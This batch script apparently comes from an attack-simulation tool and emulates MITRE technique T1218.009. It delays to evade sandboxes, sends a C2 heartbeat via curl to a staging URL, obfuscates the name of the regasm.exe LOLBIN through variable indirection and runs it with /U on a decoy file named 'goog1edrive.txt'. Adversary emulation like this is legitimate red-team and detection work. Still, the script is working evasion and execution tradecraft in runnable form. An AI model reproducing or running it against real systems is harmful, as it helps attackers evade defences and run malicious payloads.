@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments - plain literals only
SET txisnba=%APPDATA%\8730\f80ec4f6
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8730-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=goog1edrive.txt
SET dvhhyc=8730

REM Log file path
SET logf=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial delay to evade sandbox
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=30s>> "!logf!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete=30s>> "!logf!" 2>nul

REM C2 heartbeat (must not be obfuscated)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!logf!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!logf!" 2>nul

REM Delay between operations
ping -n 8 127.0.0.1 >nul

REM Obfuscated LOLBIN and arguments using variable indirection
SET a=reg
SET b=asm
SET c=.exe
SET d=/U
SET cmd1=a
SET cmd2=b
SET cmd3=c
SET cmd4=d
SET arg1=xzanpex

REM Build and execute command using CALL SET for double expansion
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>> "!logf!" 2>nul
cd /d "!txisnba!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=!CD!>> "!logf!" 2>nul

CALL SET lolbin=%%!cmd1!%%%%!cmd2!%%%%!cmd3!%%
CALL SET arg=%%!cmd4!%%
CALL SET filearg=%%!arg1!%%

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_start=!lolbin! !arg! !filearg!>> "!logf!" 2>nul

REM Execute with dynamic variable expansion
%lolbin% !arg! "!filearg!"

REM Set TTP result based on errorlevel
IF ERRORLEVEL 1 (
    SET res=0
    SET err=regasm_failed
) ELSE (
    SET res=1
    SET err=
)

REM Log TTP execution
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_complete=errorlevel!ERRORLEVEL!>> "!logf!" 2>nul
echo [!DATE! !TIME!.000][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218.009|Regasm=!res!:!err!>> "!logf!" 2>nul

REM Random final delay
SET /A rdelay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!rdelay!s>> "!logf!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>> "!logf!" 2>nul

ENDLOCAL